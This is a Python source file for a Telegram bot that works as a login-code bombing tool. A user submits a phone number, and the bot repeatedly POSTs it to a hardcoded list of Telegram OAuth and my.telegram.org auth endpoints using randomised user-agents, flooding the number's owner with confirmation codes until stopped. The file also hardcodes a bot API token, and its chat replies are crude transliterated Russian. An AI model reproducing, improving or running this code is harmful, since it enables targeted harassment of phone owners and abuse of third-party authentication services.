import telebot
import requests
from fake_useragent import UserAgent
import threading
import time
import re

bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")

endpoints = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password'
]

active_spams = {}
awaiting_phone = set()

def is_phone(text):
    return bool(re.match(r'^\+?\d{7,15}$', text.strip()))

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.add('spam')
    bot.send_message(message.chat.id, "privet yeban lizni bebru", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'spam')
def ask_phone(message):
    chat_id = message.chat.id
    if chat_id in active_spams:
        bot.reply_to(message, "spam uje idet, chtoby ostanovit' /stop")
        return
    awaiting_phone.add(chat_id)
    bot.reply_to(message, "napishi nomer telephona")

@bot.message_handler(func=lambda m: m.chat.id in awaiting_phone and is_phone(m.text))
def start_spam(message):
    chat_id = message.chat.id
    awaiting_phone.discard(chat_id)
    if chat_id in active_spams:
        return
    phone = message.text.strip()
    bot.reply_to(message, "drochka nachata shob ostanovit napishi /stop")
    stop_event = threading.Event()
    active_spams[chat_id] = stop_event
    def spam_worker():
        ua = UserAgent()
        while not stop_event.is_set():
            headers = {'user-agent': ua.random}
            data = {'phone': phone}
            for endpoint in endpoints:
                if stop_event.is_set():
                    break
                try:
                    requests.post(endpoint, headers=headers, data=data, timeout=10)
                except:
                    pass
                time.sleep(1)
            time.sleep(5)
        active_spams.pop(chat_id, None)
        bot.send_message(chat_id, "spam ostanovlen")
    threading.Thread(target=spam_worker).start()

@bot.message_handler(commands=['stop'])
def stop_spam(message):
    chat_id = message.chat.id
    if chat_id in active_spams:
        active_spams[chat_id].set()
        bot.reply_to(message, "ostanavlivaem spam...")
    else:
        bot.reply_to(message, "net aktivnogo spama")

@bot.message_handler(func=lambda m: True)
def fallback(message):
    chat_id = message.chat.id
    if chat_id in awaiting_phone:
        awaiting_phone.discard(chat_id)
        bot.reply_to(message, "nomer ne raspoznan, poprobuyte snova cherez 'spam'")
    else:
        bot.reply_to(message, "neponyatno, ispolzuy /start ili /stop")

if __name__ == '__main__':
    bot.infinity_polling()
